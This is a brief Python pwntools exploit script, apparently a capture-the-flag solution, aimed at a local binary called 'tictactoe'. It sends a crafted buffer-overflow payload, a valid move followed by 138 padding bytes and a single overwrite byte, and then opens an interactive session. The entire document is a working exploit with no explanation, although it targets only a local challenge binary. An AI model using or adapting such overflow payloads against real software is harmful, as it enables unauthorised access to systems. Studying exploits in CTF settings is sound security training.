from pwn import *

context.log_level = "debug"
io = process("./tictactoe")

payload = "(2,2)" + (143 - 5) * 'a' + "\x01"
io.recvuntil("): ")
io.sendline(payload)
io.interactive()
